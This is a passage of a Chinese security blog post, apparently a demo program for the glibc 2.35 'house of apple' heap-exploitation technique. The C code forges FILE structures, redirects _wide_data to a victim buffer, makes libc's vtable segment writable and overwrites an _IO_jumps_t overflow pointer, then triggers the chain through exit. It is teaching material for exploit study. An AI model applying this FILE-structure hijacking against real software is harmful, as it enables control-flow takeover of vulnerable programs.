&amp; 8 != 0即可。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    fake_FILE-&gt;_flags2 = <span class="number">0x8</span>;</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;我们将这里修改为目标地址。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    fake_FILE-&gt;_wide_data = (<span class="keyword">struct</span> _IO_wide_data *) (<span class="type">char</span> *) victim;</span><br><span class="line"></span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;修改前：\n&quot;</span>);</span><br><span class="line">    print_binary((<span class="type">char</span>*)victim, <span class="number">0x80</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;为了能够在exit函数调用后看到修改后的目标地址内容，需要另外一个假FILE结构体。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;实际上在house of apple之后，也多使用另一个FILE结构体进行其他的操作。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;将第二个假FILE结构体地址填到第一个FILE的_chain字段，使两者链接。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;第二个结构体使用另外一个_IO_jumps_t指针。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    FILE* fake_FILE_2 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">    fake_FILE-&gt;_chain = fake_FILE_2;</span><br><span class="line"></span><br><span class="line">    mprotect((<span class="type">void</span>*)(libc_base + <span class="number">0x215000</span>), <span class="number">0x4000</span>, PROT_READ | PROT_WRITE);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;本程序为了方便起见，选择直接修改vtable段为可写，&quot;</span></span><br><span class="line">                                                        <span class="string">&quot;并修改第二个FILE使用的_IO_jumps_t中的overflow指针。\n&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span>* other_IO_jumps = (<span class="type">size_t</span>*)(libc_base + <span class="number">0x215E80</span>);</span><br><span class="line">    other_IO_jumps[<span class="number">3</span>] = (<span class="type">size_t</span>)print_victim;</span><br><span class="line"></span><br><span class="line">    fake_FILE_2-&gt;_mode = <span class="number">0</span>;</span><br><span class="line">    fake_FILE_2-&gt;_IO_write_ptr = (<span class="type">char</span>*)<span class="number">1</span>;</span><br><span class="line">    fake_FILE_2-&gt;_IO_write_base = (<span class="type">char</span>*)<span class="number">0</span>;</span><br><span class="line">    ((<span class="type">size_t</span>*)fake_FILE_2)[<span class="number">0xd8</span> / <span class="number">8</span>] = libc_base + <span class="number">0x215E80</span>;</span><br><span class="line">    fake_FILE_2-&gt;_flags2 = <span class="number">0x8</span>;</span><br><span class="line">    fake_FILE_2-&gt;_wide_data = (<span class="keyword">struct</span> _IO_wide_data *) (<span class="type">char</span> *) victim;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

    </div>

    
    
    

      <footer class="post-footer">

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2023/02/28/glibc-2-31-pwn%E2%80%94%E2%80%94house-of-pig%E5%8E%9F%E9%A2%98%E5%88%86%E6%9E%90%E4%B8%8E%E7%A4%BA%E4%BE%8B%E7%A8%8B%E5%BA%8F/" rel="prev" title="glibc 2.31 pwn——house of pig原题分析与示例程序">
      <i class="fa fa-chevron-left"></i> glibc 2.31 pwn——house of pig原题分析与示例程序
    </a></div>
      <div class="post-nav-item">
    <a href="/2023/02/28/glibc-2-35-pwn%E2%80%94%E2%80%94house-of-emma%E7%A4%BA%E4%BE%8B%E7%A8%8B%E5%BA%8F/" rel="next" title="glibc 2.35 pwn——house of emma示例程序">
      glibc 2.35 pwn——house of emma示例程序 <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">CoLin</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">101</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">15</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/Hornos3" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Hornos3" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://blog.csdn.net/qq_54218833?spm=1000.2115.3001.5343" title="CSDN → https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_54218833?spm&#x3D;1000.2115.3001.5343" rel="noopener" target="_blank"><i class="fa fa-crosshairs fa-fw"></i>CSDN</a>
      </span>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">CoLin</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
      <span class="post-meta-item-text">Symbols count total: </span>
    <span title="Symbols count total">889k</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
      <span class="post-meta-item-text">Reading time total &asymp;</span>
    <span title="Reading time total">13:28</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a>
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

  

</body>
</html>
